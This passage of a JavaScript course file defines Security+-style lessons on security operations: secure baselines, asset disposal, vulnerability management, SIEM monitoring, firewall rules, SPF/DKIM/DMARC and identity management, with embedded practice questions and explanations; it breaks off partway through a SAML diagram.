/* Domain 4: Security Operations — original lesson content. */
(function () {
  var D = SEC.D;

  SEC.addLesson('4.1', {
    title: 'Securing Computing Resources',
    minutes: 35,
    intro: 'This objective is about applying security to real devices: building <strong>secure baselines</strong>, hardening different device types, securing <strong>wireless</strong> and <strong>mobile</strong> devices, and building security into <strong>applications</strong>.',
    terms: [
      ['Secure baseline', 'An approved, documented secure configuration for a type of system.'],
      ['WPA3', 'Wi-Fi Protected Access 3. Current Wi-Fi security; uses SAE instead of a pre-shared-key handshake.'],
      ['SAE', 'Simultaneous Authentication of Equals. WPA3-Personal handshake that resists offline password cracking.'],
      ['RADIUS', 'Remote Authentication Dial-In User Service. Central AAA server used by enterprise Wi-Fi and VPNs.'],
      ['MDM', 'Mobile Device Management. Centrally enforces policies on phones and tablets.'],
      ['BYOD / COPE / CYOD', 'Bring Your Own Device / Corporate-Owned, Personally Enabled / Choose Your Own Device.'],
      ['Sandboxing', 'Running code in an isolated environment so it can’t affect the rest of the system.'],
      ['Code signing', 'Digitally signing software so users can verify its publisher and integrity.']
    ],
    sections: [
      {
        h: 'Secure baselines',
        body: '<p>A baseline is a known-good configuration. The lifecycle has three steps:</p>',
        diagram: D.flow([{ t: 'Establish', sub: 'use CIS benchmarks / vendor guides', tone: 'accent' }, { t: 'Deploy', sub: 'GPO, MDM, IaC, images', tone: 'good' }, { t: 'Maintain', sub: 'scan for drift, update', tone: 'warn' }], 'Secure baseline lifecycle', { loop: true, loopLabel: 'review when software or threats change' }),
        check: { q: 'Compliance scans show that several servers no longer match the approved configuration because admins made ad hoc changes. Which baseline activity addresses this?', o: [
          ['Establish', 'The baseline already exists.'],
          ['Deploy', 'It was deployed; the problem is drift afterward.'],
          ['Maintain', 'Maintaining a baseline includes detecting and correcting configuration drift.', true],
          ['Decommission', 'The servers are still needed.']
        ] }
      },
      {
        h: 'Hardening targets',
        body: '<ul><li><strong>Mobile devices</strong>: screen lock, encryption, MDM, OS updates, no sideloading.</li><li><strong>Workstations</strong>: patches, EDR, host firewall, remove admin rights, disable unused services.</li>' +
          '<li><strong>Switches/routers</strong>: change default credentials, disable Telnet/HTTP in favor of SSH/HTTPS, use SNMPv3, disable unused ports, back up configs.</li>' +
          '<li><strong>Cloud infrastructure</strong>: least-privilege IAM, no public buckets, logging enabled, security groups restricted.</li><li><strong>Servers</strong>: minimal installed roles, patched, logging, least-privilege service accounts.</li>' +
          '<li><strong>ICS/SCADA, embedded, RTOS, IoT</strong>: segmentation, change defaults, vendor firmware updates, disable unneeded features.</li></ul>'
      },
      {
        h: 'Wireless security',
        body: '<ul><li><strong>Site survey</strong>: physically measuring signal and interference before installing APs. A <strong>heat map</strong> visualizes coverage. It finds dead zones and signal leaking outside the building.</li>' +
          '<li><strong>WPA3-Personal</strong>: uses SAE, which resists offline dictionary attacks. Best for home or small office with a shared passphrase.</li>' +
          '<li><strong>WPA3-Enterprise</strong>: each user authenticates individually through <strong>802.1X</strong> with a <strong>RADIUS</strong> server. Supports 192-bit security mode.</li>' +
          '<li><strong>Authentication protocols</strong>: EAP-TLS (certificates on both sides, strongest), PEAP and EAP-TTLS (server certificate + user password inside a TLS tunnel).</li>' +
          '<li>Avoid WEP, WPA/TKIP and WPS (its PIN can be brute-forced).</li></ul>',
        compare: { title: 'WPA3-Personal vs WPA3-Enterprise', head: ['', 'Personal', 'Enterprise'], rows: [['Authentication', 'Shared passphrase (SAE)', 'Individual credentials via 802.1X/RADIUS'], ['Revoke one user', 'Change passphrase for everyone', 'Disable that user’s account or certificate'], ['Best for', 'Home, small office', 'Organizations with a directory']] },
        check: { q: 'A company wants Wi-Fi where each employee authenticates with their own credentials and access is removed when they leave. What should it deploy?', o: [
          ['WPA3-Personal with a strong passphrase', 'A shared passphrase can’t identify or individually revoke users.'],
          ['WPA3-Enterprise with 802.1X and RADIUS', 'Enterprise mode authenticates each user against a central server.', true],
          ['Open network with captive portal', 'Open networks don’t encrypt traffic over the air.'],
          ['WPS', 'WPS is a convenience feature with known weaknesses.']
        ] }
      },
      {
        h: 'Mobile solutions and deployment models',
        body: '<p><strong>MDM</strong> enforces passcodes, encryption, app restrictions and remote wipe, and can create a separate work container on personal devices.</p>',
        compare: { title: 'Mobile deployment models', head: ['Model', 'Who owns the device', 'Company control', 'Notes'], rows: [
          ['BYOD', 'Employee', 'Lowest', 'Privacy concerns; use containerization/MDM'],
          ['COPE', 'Company', 'High', 'Personal use permitted'],
          ['CYOD', 'Company (from an approved list)', 'High', 'Employee picks from approved models'],
          ['Corporate-owned only', 'Company', 'Highest', 'Business use only']] },
        check: { q: 'Which deployment model gives employees a choice of device while the company owns and fully manages it?', o: [
          ['BYOD', 'The employee owns the device in BYOD.'],
          ['CYOD', 'Employees choose from approved company-owned models.', true],
          ['COPE', 'COPE is company-owned and allows personal use, but the company typically picks the device.'],
          ['VDI', 'VDI is a desktop virtualization technology, not a device ownership model.']
        ] }
      },
      {
        h: 'Connection methods',
        body: '<p><strong>Cellular</strong> (carrier network; watch for SIM swapping and rogue base stations), <strong>Wi-Fi</strong> (watch for evil twins on public networks, so use a VPN), <strong>Bluetooth</strong> (keep it non-discoverable; attacks include bluejacking and bluesnarfing).</p>'
      },
      {
        h: 'Application security',
        body: '<ul><li><strong>Input validation</strong>: accept only expected input (type, length, format), on the server side. This prevents injection and overflows.</li>' +
          '<li><strong>Secure cookies</strong>: set <code>Secure</code> (HTTPS only), <code>HttpOnly</code> (no JavaScript access, which limits XSS session theft) and <code>SameSite</code> (limits CSRF).</li>' +
          '<li><strong>Static code analysis (SAST)</strong>: scans source code without running it. Finds bugs early.</li><li><strong>Code signing</strong>: proves publisher identity and that code wasn’t altered.</li>' +
          '<li><strong>Sandboxing</strong>: runs apps or suspicious files in isolation.</li><li><strong>Monitoring</strong>: application logs and runtime protection.</li></ul>',
        check: { q: 'Which cookie attribute prevents client-side scripts from reading a session cookie, which limits the impact of XSS?', o: [
          ['Secure', 'Secure ensures the cookie is sent only over HTTPS.'],
          ['HttpOnly', 'HttpOnly blocks JavaScript access to the cookie.', true],
          ['SameSite', 'SameSite restricts cross-site sending (CSRF protection).'],
          ['Expires', 'This controls lifetime only.']
        ] }
      }
    ],
    takeaways: [
      'Baselines: establish (benchmarks) → deploy (GPO/MDM/images) → maintain (detect drift).',
      'WPA3-Personal uses SAE; WPA3-Enterprise uses 802.1X + RADIUS; EAP-TLS uses certificates both ways. Disable WPS.',
      'Site surveys and heat maps plan AP placement and find signal leakage.',
      'BYOD (employee-owned), COPE (company-owned, personal use), CYOD (choose from approved list); MDM enforces policy.',
      'App security: server-side input validation, Secure/HttpOnly/SameSite cookies, SAST, code signing, sandboxing.'
    ]
  });

  SEC.addLesson('4.2', {
    title: 'Hardware, Software and Data Asset Management',
    minutes: 20,
    intro: 'You can’t protect what you don’t know you have. <strong>Asset management</strong> follows every device, license and data set from purchase to disposal, and each stage has security implications.',
    terms: [
      ['Asset inventory', 'A maintained list of hardware, software and data assets with owners and locations.'],
      ['Enumeration', 'Actively discovering assets (e.g., network scans) to find unknown or unmanaged devices.'],
      ['Sanitization', 'Removing data from media so it can’t be recovered (overwriting, cryptographic erase, degaussing).'],
      ['Certificate of destruction', 'Documentation from a disposal vendor proving media was destroyed.'],
      ['Data retention', 'Rules for how long data must (or may) be kept.']
    ],
    sections: [
      {
        h: 'The asset lifecycle',
        body: '',
        diagram: D.flow([{ t: 'Acquire', sub: 'approved vendors, security review', tone: 'accent' }, { t: 'Assign', sub: 'owner, classification' }, { t: 'Monitor', sub: 'inventory, enumeration', tone: 'warn' }, { t: 'Dispose', sub: 'sanitize, destroy, certify', tone: 'bad' }], 'Asset lifecycle'),
        check: { q: 'A network scan discovers a wireless access point that isn’t in the inventory. Which asset management activity found it?', o: [
          ['Procurement', 'Procurement is buying assets.'],
          ['Enumeration', 'Actively discovering devices on the network is enumeration.', true],
          ['Sanitization', 'Sanitization is removing data at disposal.'],
          ['Classification', 'Classification labels data sensitivity.']
        ] }
      },
      {
        h: 'Acquisition and assignment',
        body: '<p><strong>Procurement</strong> should include security requirements: buy from reputable vendors (supply chain risk), confirm support lifetimes and update policies, and make sure software licenses are legitimate.</p><p><strong>Assignment/accounting</strong>: every asset gets an <strong>owner</strong> (accountable person) and a <strong>classification</strong> (how sensitive it is or the data on it), which determine the controls applied.</p>'
      },
      {
        h: 'Monitoring and tracking',
        body: '<p>Keep an accurate <strong>inventory</strong> (CMDB, asset tags, MDM). Use <strong>enumeration</strong> to find unknown devices and shadow IT. Untracked assets go unpatched and become entry points.</p>'
      },
      {
        h: 'Disposal and decommissioning',
        body: '<ul><li><strong>Sanitization</strong>: overwriting (wiping), <em>cryptographic erase</em> (destroy the encryption key; fast and good for SSDs and self-encrypting drives), <em>degaussing</em> (magnetic media only; doesn’t work on SSDs).</li>' +
          '<li><strong>Destruction</strong>: shredding, pulverizing, incineration. Use it for the most sensitive media or when reuse isn’t needed.</li>' +
          '<li><strong>Certification</strong>: get a certificate of destruction/sanitization from vendors as proof.</li>' +
          '<li><strong>Data retention</strong>: keep data as long as legally required, and no longer. Over-retention increases breach impact and legal exposure.</li></ul>',
        compare: { title: 'Sanitization methods', head: ['Method', 'Works on', 'Media reusable?'], rows: [['Overwrite / wipe', 'HDDs (SSDs unreliable due to wear leveling)', 'Yes'], ['Cryptographic erase', 'Encrypted drives, SSDs', 'Yes'], ['Degaussing', 'Magnetic media (HDD, tape)', 'Usually no'], ['Physical destruction', 'All media', 'No']] },
        check: { q: 'A company is selling used SSDs from encrypted laptops and needs fast, reliable sanitization that keeps the drives usable. What method fits best?', o: [
          ['Degaussing', 'Degaussing doesn’t work on SSDs and can ruin drives.'],
          ['Cryptographic erase', 'Destroying the encryption key renders the data unreadable and keeps the drive reusable.', true],
          ['Shredding', 'Shredding destroys the drive.'],
          ['Deleting the files and emptying the recycle bin', 'Deleted files remain recoverable.']
        ] }
      }
    ],
    takeaways: [
      'Lifecycle: acquire (secure procurement) → assign (owner + classification) → monitor (inventory, enumeration) → dispose.',
      'Unknown assets are unmanaged and unpatched. Enumeration finds them.',
      'Degaussing = magnetic media only; cryptographic erase suits SSDs; destruction is final. Obtain certificates.',
      'Retain data only as long as required by policy and law.'
    ]
  });

  SEC.addLesson('4.3', {
    title: 'Vulnerability Management',
    minutes: 35,
    intro: 'Vulnerability management is a continuous cycle: <strong>identify</strong> weaknesses, <strong>analyze</strong> and prioritize them, <strong>respond</strong>, <strong>validate</strong> the fix and <strong>report</strong>. The exam expects you to read CVSS scores, tell false positives from false negatives, and pick the right response.',
    terms: [
      ['CVE', 'Common Vulnerabilities and Exposures. A unique ID for a publicly known vulnerability (e.g., CVE-2024-12345).'],
      ['CVSS', 'Common Vulnerability Scoring System. Severity score 0.0–10.0.'],
      ['False positive / negative', 'Scanner reports a vulnerability that doesn’t exist / misses one that does.'],
      ['SAST / DAST', 'Static (code, not running) / Dynamic (running app) application security testing.'],
      ['OSINT', 'Open-Source Intelligence. Publicly available information.'],
      ['Bug bounty', 'A program that rewards external researchers for reporting vulnerabilities.'],
      ['Credentialed scan', 'A scan that logs into hosts for deeper, more accurate results.']
    ],
    sections: [
      {
        h: 'The cycle',
        body: '',
        diagram: D.cycle(['Identify', 'Analyze & prioritize', 'Respond / remediate', 'Validate', 'Report'], 'The vulnerability management cycle', 'Continuous')
      },
      {
        h: 'Identification methods',
        body: '<ul><li><strong>Vulnerability scans</strong>: <em>credentialed</em> scans log in and see installed software and configs (more accurate). <em>Non-credentialed</em> scans show the outsider’s view. <em>Agent-based</em> scanning works for laptops off-network.</li>' +
          '<li><strong>Application security</strong>: <em>static analysis</em> (SAST) reads source code; <em>dynamic analysis</em> (DAST) attacks the running app; <em>package monitoring</em> tracks vulnerable third-party libraries (software composition analysis/SBOM).</li>' +
          '<li><strong>Threat feeds</strong>: OSINT, proprietary/commercial feeds, information-sharing organizations (ISACs), and dark web monitoring for leaked credentials.</li>' +
          '<li><strong>Penetration testing</strong>: humans actively exploit weaknesses to prove impact.</li>' +
          '<li><strong>Responsible disclosure</strong> and <strong>bug bounty</strong> programs: external researchers report flaws safely.</li><li><strong>System/process audits</strong>.</li></ul>',
        compare: { title: 'Vulnerability scan vs Penetration test', head: ['', 'Vulnerability scan', 'Penetration test'], rows: [['Approach', 'Automated, broad', 'Manual + tools, deep'], ['Exploits flaws?', 'No (identifies them)', 'Yes (proves impact)'], ['Frequency', 'Frequent / continuous', 'Periodic (e.g., annually)'], ['Risk to systems', 'Low', 'Higher, so it needs rules of engagement']] }
      },
      {
        h: 'Analysis: confirming and prioritizing',
        body: '<ul><li><strong>Confirm</strong> findings: a <em>false positive</em> wastes effort; a <em>false negative</em> is dangerous because the flaw stays hidden. Correlate with patch levels, versions and credentialed scan data.</li>' +
          '<li><strong>Prioritize</strong> using <strong>CVSS</strong> (0.1–3.9 low, 4.0–6.9 medium, 7.0–8.9 high, 9.0–10.0 critical) and the <strong>CVE</strong> details.</li>' +
          '<li>Adjust for context: <strong>exposure factor</strong>, <strong>environmental variables</strong> (internet-facing? compensating controls?), <strong>industry/organizational impact</strong>, and <strong>risk tolerance</strong>.</li></ul>' +
          '<div class="ex">A CVSS 9.8 flaw on an isolated lab machine with no sensitive data may rank below a CVSS 7.5 flaw on an internet-facing payment server. Context matters.</div>',
        check: { q: 'A scanner reports a critical Apache vulnerability on a server that runs only IIS and has no Apache installed. What is this?', o: [
          ['False negative', 'A false negative is a missed real vulnerability.'],
          ['False positive', 'The scanner reported a flaw that doesn’t exist on that system.', true],
          ['True positive', 'The software isn’t present, so the finding isn’t real.'],
          ['Zero-day', 'A zero-day is an unknown, unpatched flaw.']
        ] }
      },
      {
        h: 'Response and remediation',
        body: '<ul><li><strong>Patching</strong>: the preferred fix.</li><li><strong>Insurance</strong>: transfers some financial risk (cyber insurance).</li><li><strong>Segmentation</strong>: isolate what can’t be fixed yet.</li>' +
          '<li><strong>Compensating controls</strong>: WAF rules, disabling a feature, extra monitoring.</li><li><strong>Exceptions/exemptions</strong>: formally accept the risk for a defined period with approval and documentation.</li></ul>',
        check: { q: 'A critical vulnerability affects a medical device whose vendor won’t release a patch for six months. What is the BEST immediate response?', o: [
          ['Ignore it until the patch is released', 'Leaving a critical flaw unaddressed is unacceptable.'],
          ['Isolate the device with segmentation and apply compensating controls, documenting an exception', 'This reduces risk now and formally tracks the accepted residual risk.', true],
          ['Install an unofficial patch from a forum', 'Unofficial patches may break the device or be malicious.'],
          ['Remove the CVE from the scanner so reports stay clean', 'Hiding the finding doesn’t reduce risk.']
        ] }
      },
      {
        h: 'Validation and reporting',
        body: '<p><strong>Validate</strong> remediation by <em>rescanning</em>, <em>auditing</em> and <em>verification</em> (confirm the patch is actually installed and effective). Then <strong>report</strong> trends (time to remediate, open critical findings) to management.</p>'
      }
    ],
    takeaways: [
      'Cycle: identify → analyze → respond → validate → report, continuously.',
      'Credentialed scans are more accurate; SAST reads code, DAST tests the running app; package monitoring tracks libraries.',
      'False positive = reported but not real; false negative = real but missed (more dangerous).',
      'CVSS gives base severity; prioritize with context (exposure, environment, business impact).',
      'Responses: patch, segment, compensating controls, insurance, or a documented exception. Always rescan to validate.'
    ]
  });

  SEC.addLesson('4.4', {
    title: 'Security Alerting and Monitoring',
    minutes: 30,
    intro: 'Monitoring turns raw events into actionable alerts. You need to know what to monitor, the activities involved (aggregation, alerting, tuning) and the tools: <strong>SIEM</strong>, <strong>SCAP</strong>, <strong>DLP</strong>, <strong>SNMP</strong>, <strong>NetFlow</strong> and more.',
    terms: [
      ['SIEM', 'Security Information and Event Management. Collects, correlates and alerts on logs from many sources.'],
      ['SCAP', 'Security Content Automation Protocol. Standards for automated configuration and vulnerability checking.'],
      ['Benchmark', 'A published secure configuration standard (e.g., CIS Benchmarks).'],
      ['DLP', 'Data Loss Prevention. Detects and blocks sensitive data leaving the organization.'],
      ['SNMP trap', 'An unsolicited alert sent by a network device to a management station.'],
      ['NetFlow', 'Metadata about network flows (who talked to whom, how much, when), not full packets.'],
      ['Alert tuning', 'Adjusting rules to reduce false positives without missing real threats.']
    ],
    sections: [
      {
        h: 'What to monitor',
        body: '<p>Monitor <strong>systems</strong> (OS logs, logins, processes), <strong>applications</strong> (errors, authentication, transactions) and <strong>infrastructure</strong> (firewalls, switches, cloud control planes).</p>'
      },
      {
        h: 'Monitoring activities',
        body: '',
        diagram: D.flow([{ t: 'Log aggregation', sub: 'collect & normalize' }, { t: 'Correlate & alert', sub: 'rules, analytics', tone: 'accent' }, { t: 'Respond', sub: 'quarantine, ticket', tone: 'warn' }, { t: 'Validate & tune', sub: 'reduce false positives', tone: 'good' }, { t: 'Report & archive', sub: 'retention, compliance' }], 'SIEM monitoring workflow', { bw: 120 }),
        check: { q: 'Analysts ignore a SIEM rule because it fires hundreds of times a day for a legitimate backup job. What should be done?', o: [
          ['Delete the rule entirely', 'This could hide real attacks matching the rule.'],
          ['Tune the rule to exclude the known-good backup activity', 'Alert tuning reduces false positives while keeping detection.', true],
          ['Increase log retention', 'Retention doesn’t affect alert noise.'],
          ['Disable log aggregation for the backup server', 'This would blind you to real events on that server.']
        ] }
      },
      {
        h: 'Key tools',
        body: '<ul><li><strong>SIEM</strong>: central log collection, correlation across sources (e.g., VPN login + impossible travel + data download), dashboards, alerts, long-term retention.</li>' +
          '<li><strong>SCAP</strong> and <strong>benchmarks</strong>: automated checks that systems match secure configurations (e.g., CIS).</li>' +
          '<li><strong>Agents vs agentless</strong>: agents give deep host visibility and work off-network; agentless is easier to deploy but less detailed.</li>' +
          '<li><strong>Antivirus</strong> and <strong>DLP</strong>: block malware / detect sensitive data leaving via email, web, USB, or cloud.</li>' +
          '<li><strong>SNMP traps</strong>: devices push alerts (e.g., a link down). Use SNMPv3 for authentication and encryption.</li>' +
          '<li><strong>NetFlow</strong>: flow metadata. Great for spotting unusual volumes, beaconing and lateral movement without storing full packets.</li>' +
          '<li><strong>Vulnerability scanners</strong> feed findings into monitoring.</li></ul>',
        compare: { title: 'NetFlow vs Packet capture', head: ['', 'NetFlow', 'Full packet capture'], rows: [['Content', 'Metadata (IPs, ports, bytes, times)', 'Entire packets including payload'], ['Storage', 'Small', 'Very large'], ['Best for', 'Traffic patterns, volumes, anomalies', 'Deep forensic analysis of content']] },
        check: { q: 'A team needs to know which internal hosts sent unusually large amounts of data to external IPs last month, without storing full packet contents. Which source is best?', o: [
          ['NetFlow records', 'Flow metadata shows source, destination and volume efficiently.', true],
          ['SNMP traps', 'Traps report device events, not per-flow traffic volumes.'],
          ['Full packet capture', 'This would work but stores enormous amounts of data, which the requirement rules out.'],
          ['Antivirus logs', 'These show malware detections, not traffic volumes.']
        ] }
      },
      {
        h: 'Alert response',
        body: '<p>When an alert fires: triage (true or false positive?), <strong>quarantine</strong> affected hosts if needed, open a ticket, remediate, then <strong>validate</strong> and <strong>tune</strong>. Archive logs according to retention requirements for later investigations and audits.</p>'
      }
    ],
    takeaways: [
      'Monitoring flow: aggregate → correlate/alert → respond (quarantine) → validate/tune → report/archive.',
      'SIEM correlates many log sources; SCAP/benchmarks automate configuration compliance.',
      'NetFlow = metadata about traffic; packet capture = full contents.',
      'SNMP traps push device alerts (use SNMPv3). DLP watches for sensitive data leaving.',
      'Tune noisy rules rather than disabling them.'
    ]
  });

  SEC.addLesson('4.5', {
    title: 'Enhancing Enterprise Security Capabilities',
    minutes: 40,
    intro: 'This scenario objective asks you to <strong>modify</strong> security tools: write firewall rules, tune IDS/IPS, configure web and DNS filtering, choose secure protocols, set up email authentication (SPF, DKIM, DMARC), and deploy FIM, DLP, NAC, EDR/XDR and UBA.',
    terms: [
      ['ACL', 'Access Control List. Ordered allow/deny rules; first match wins, then implicit deny.'],
      ['Implicit deny', 'Anything not explicitly allowed is blocked.'],
      ['SPF', 'Sender Policy Framework. DNS record listing which servers may send mail for a domain.'],
      ['DKIM', 'DomainKeys Identified Mail. Digitally signs email so receivers can verify it wasn’t altered.'],
      ['DMARC', 'Tells receivers what to do when SPF/DKIM fail (none, quarantine, reject) and sends reports.'],
      ['FIM', 'File Integrity Monitoring. Alerts when critical files change.'],
      ['NAC', 'Network Access Control. Checks device identity/health before granting network access.'],
      ['EDR / XDR', 'Endpoint Detection and Response / Extended Detection and Response across endpoints, network, cloud and email.'],
      ['UBA/UEBA', 'User (and Entity) Behavior Analytics. Baselines normal behavior and flags anomalies.'],
      ['SELinux', 'Security-Enhanced Linux. Mandatory access control for Linux.']
    ],
    sections: [
      {
        h: 'Firewall rules',
        body: '<p>Firewalls evaluate rules <strong>top to bottom</strong>; the <strong>first match</strong> decides. If nothing matches, the <strong>implicit deny</strong> blocks the traffic. Put specific rules above general ones, and never place a broad “allow any” above your deny rules.</p>' +
          '<pre>1 ALLOW TCP  ANY        → WEB-SRV   443   # public HTTPS\n2 ALLOW TCP  ADMIN-NET  → WEB-SRV   22    # SSH from admins only\n3 DENY  ANY  ANY        → ANY       ANY   # explicit deny (logged)</pre>' +
          '<p>A <strong>screened subnet</strong> uses rules like these to allow the internet to reach only specific DMZ services, and the DMZ to reach only specific internal services (e.g., web server → database on 1433).</p>',
        check: { q: 'Rule 1 is “ALLOW ANY ANY ANY” and rule 2 is “DENY TCP ANY → DB-SRV 1433.” Why is rule 2 ineffective?', o: [
          ['Rule 2 uses the wrong port', '1433 is SQL Server’s default port; the port is not the issue.'],
          ['Rule 1 matches all traffic first, so rule 2 is never evaluated', 'First match wins; the broad allow shadows the deny.', true],
          ['Deny rules must always be last', 'Specific denies often belong above broader allows.'],
          ['The implicit deny overrides rule 2', 'The implicit deny applies only when nothing matches.']
        ] }
      },
      {
        h: 'Ports and secure protocols',
        body: '<p>Know the common ports and swap insecure protocols for secure ones:</p>',
        compare: { title: 'Insecure protocols and their secure replacements', head: ['Insecure (port)', 'Secure replacement (port)', 'Purpose'], rows: [
          ['Telnet (23)', 'SSH (22)', 'Remote shell'], ['FTP (20/21)', 'SFTP (22) or FTPS (989/990)', 'File transfer'], ['HTTP (80)', 'HTTPS (443)', 'Web'],
          ['SMTP (25)', 'SMTP with STARTTLS (587) / SMTPS (465)', 'Email sending'], ['POP3 (110) / IMAP (143)', 'POP3S (995) / IMAPS (993)', 'Email retrieval'],
          ['LDAP (389)', 'LDAPS (636)', 'Directory'], ['SNMPv1/v2c (161)', 'SNMPv3 (161)', 'Device management'], ['DNS (53)', 'DNSSEC (integrity) / DoH (443) / DoT (853)', 'Name resolution'],
          ['RDP (3389)', 'RDP via VPN/gateway with NLA', 'Remote desktop'], ['SMB (445)', 'SMBv3 with encryption, never exposed to internet', 'File sharing']] },
        check: { q: 'Network devices are managed with SNMPv2c community strings sent in clear text. What is the secure replacement?', o: [
          ['SNMPv1', 'v1 is even weaker.'],
          ['SNMPv3', 'SNMPv3 adds authentication and encryption.', true],
          ['Telnet', 'Telnet is also clear text and isn’t a replacement for SNMP.'],
          ['NetFlow', 'NetFlow exports traffic metadata; it doesn’t replace SNMP management.']
        ] }
      },
      {
        h: 'IDS/IPS: signatures and trends',
        body: '<p><strong>Signature-based</strong> detection matches known attack patterns. It is accurate but misses new attacks. <strong>Anomaly/behavior-based</strong> (trend) detection learns a baseline and flags deviations. It can catch new attacks but produces more false positives. Keep signatures updated and tune rules for your environment.</p>'
      },
      {
        h: 'Web filtering and DNS filtering',
        body: '<ul><li><strong>Agent-based</strong> web filtering runs on each endpoint and protects users anywhere. A <strong>centralized proxy</strong> filters traffic passing through the corporate network.</li>' +
          '<li>Techniques: <strong>URL scanning</strong>, <strong>content categorization</strong> (block “gambling”), <strong>block rules</strong>, and <strong>reputation</strong> (block newly registered or known-malicious domains).</li>' +
          '<li><strong>DNS filtering</strong> refuses to resolve malicious domains. It is cheap, covers every protocol and stops malware callbacks early.</li></ul>'
      },
      {
        h: 'Email security: SPF, DKIM, DMARC',
        body: '',
        diagram: D.flow([{ t: 'SPF', sub: 'Is this server allowed to send for the domain?', tone: 'accent' }, { t: 'DKIM', sub: 'Is the signature valid and the message unaltered?', tone: 'accent' }, { t: 'DMARC', sub: 'Do they align? If not: none / quarantine / reject + report', tone: 'good' }], 'Email authentication checks performed by the receiving server', { bw: 170, bh: 90 }),
        compare: { title: 'SPF vs DKIM vs DMARC', head: ['', 'SPF', 'DKIM', 'DMARC'], rows: [['Checks', 'Sending server IP is authorized', 'Cryptographic signature on message', 'Policy and alignment of SPF/DKIM with From: domain'], ['Published in', 'DNS TXT record', 'DNS (public key)', 'DNS TXT record'], ['Stops', 'Unauthorized servers', 'Tampering, forged signing', 'Direct domain spoofing (with p=reject)']] },
        check: { q: 'A company wants receiving mail servers to reject messages that fail authentication checks and to send reports about spoofing attempts. Which record should it publish?', o: [
          ['SPF', 'SPF lists authorized servers but doesn’t set a failure policy with reporting.'],
          ['DKIM', 'DKIM provides signatures, not a receiving policy.'],
          ['DMARC', 'DMARC defines the policy (reject/quarantine) and reporting addresses.', true],
          ['MX', 'MX records route incoming mail.']
        ] }
      },
      {
        h: 'Operating system security',
        body: '<p><strong>Group Policy</strong> (Windows/Active Directory) centrally enforces settings: password rules, screen lock, software restrictions. <strong>SELinux</strong> enforces mandatory access control on Linux, confining services so a compromised web server can’t read arbitrary files.</p>'
      },
      {
        h: 'FIM, DLP, NAC, EDR/XDR and UBA',
        body: '<ul><li><strong>File integrity monitoring</strong>: alerts on changes to system files, web content or configs. It detects rootkits and defacement.</li>' +
          '<li><strong>DLP</strong>: inspects email, web uploads and USB copies for sensitive patterns (card numbers, SSNs) and blocks or alerts.</li>' +
          '<li><strong>NAC</strong>: checks device posture (patched? AV running? company device?) before granting access, or sends it to a remediation VLAN.</li>' +
          '<li><strong>EDR</strong>: records endpoint activity, detects malicious behavior, and allows isolation and rollback. <strong>XDR</strong> correlates across endpoint, network, cloud, identity and email.</li>' +
          '<li><strong>UBA/UEBA</strong>: detects anomalies like a user downloading 50× their normal volume.</li></ul>',
        check: { q: 'Visitors keep plugging personal laptops into conference room network jacks and getting internal access. What should be implemented?', o: [
          ['FIM', 'FIM detects file changes, not unauthorized devices.'],
          ['NAC with 802.1X', 'NAC authenticates and checks devices before granting network access.', true],
          ['DKIM', 'DKIM is for email signing.'],
          ['UBA', 'UBA watches user behavior; it doesn’t stop the connection.']
        ] }
      }
    ],
    takeaways: [
      'Firewall rules: top-down, first match wins, implicit deny at the end. Specific rules before general ones.',
      'Replace Telnet→SSH, FTP→SFTP/FTPS, HTTP→HTTPS, LDAP→LDAPS, SNMPv1/2c→SNMPv3.',
      'SPF = authorized senders, DKIM = signature, DMARC = policy + reporting.',
      'Signature IDS misses new attacks; anomaly IDS catches new ones but is noisier.',
      'FIM detects file changes; DLP stops data leaving; NAC checks devices before access; EDR/XDR detect and respond; UBA spots unusual behavior.'
    ]
  });

  SEC.addLesson('4.6', {
    title: 'Identity and Access Management',
    minutes: 45,
    intro: 'IAM controls <strong>who</strong> gets access to <strong>what</strong>. Expect scenario questions on provisioning, access control models (MAC, DAC, RBAC, ABAC), federation and SSO, MFA factors, passwords and privileged access management.',
    terms: [
      ['Provisioning / de-provisioning', 'Creating and granting accounts / removing access when it is no longer needed.'],
      ['Identity proofing', 'Verifying someone is who they claim before issuing credentials.'],
      ['Federation', 'Trusting identities issued by another organization’s identity provider.'],
      ['SSO', 'Single Sign-On. Log in once to access many applications.'],
      ['SAML', 'Security Assertion Markup Language. XML-based federation/SSO standard, common for web apps.'],
      ['OAuth / OIDC', 'OAuth 2.0 grants delegated authorization (access tokens); OpenID Connect adds authentication on top.'],
      ['LDAP', 'Lightweight Directory Access Protocol. Queries directories such as Active Directory.'],
      ['RBAC / ABAC / MAC / DAC', 'Role-, Attribute-based, Mandatory, Discretionary access control.'],
      ['PAM', 'Privileged Access Management. Controls and monitors admin accounts.'],
      ['JIT', 'Just-in-time access. Privileges granted only when needed, for a limited time.']
    ],
    sections: [
      {
        h: 'Account lifecycle and permissions',
        body: '<ul><li><strong>Provisioning</strong>: create accounts with the access the role needs, ideally automated from HR records.</li>' +
          '<li><strong>De-provisioning</strong>: disable access immediately when someone leaves. Stale accounts are a top insider and attacker vector.</li>' +
          '<li><strong>Permission assignments</strong>: watch for <em>privilege creep</em>, where users who change jobs accumulate old permissions. Fix it with periodic access reviews.</li>' +
          '<li><strong>Attestation</strong>: managers formally confirm, on a schedule, that their staff’s access is still appropriate.</li></ul>',
        check: { q: 'An employee who moved from Finance to Marketing two years ago can still approve invoices. What problem does this illustrate, and what control addresses it?', o: [
          ['Privilege creep; periodic access reviews/attestation', 'Accumulated permissions are privilege creep; regular reviews remove them.', true],
          ['Impossible travel; geofencing', 'Nothing here involves location.'],
          ['Federation; SAML', 'Federation concerns trust between organizations.'],
          ['Password reuse; password manager', 'This is an authorization problem, not a password problem.']
        ] }
      },
      {
        h: 'Federation, SSO and directories',
        body: '<p><strong>SSO</strong> means one login opens many apps. It is convenient and reduces password fatigue, but the SSO account becomes high-value, so protect it with MFA.</p><ul>' +
          '<li><strong>LDAP</strong>: directory queries (use LDAPS).</li><li><strong>SAML</strong>: the identity provider (IdP) sends a signed XML <em>assertion</em> to the service provider (SP). Common for enterprise web SSO.</li>' +
          '<li><strong>OAuth 2.0</strong>: <em>authorization</em>. Lets an app access resources on your behalf without your password (e.g., “Allow this app to read your calendar”). <strong>OpenID Connect</strong> adds authentication.</li>' +
          '<li><strong>Federation</strong>: your company’s IdP is trusted by a partner or SaaS, so users don’t need separate accounts. <strong>Interoperability</strong> between systems relies on these standards.</li></ul>',
        diagram: D.exchange('User’s browser', 'Identity provider (IdP)', [
          { from: 'L', t: '1. User opens SaaS app (service provider) → redirected to IdP' },
          { from: 'L', t: '2. User authenticates at IdP (password + MFA)' },
          { from: 'R', t: '3. IdP returns a signed SAML assertion' },
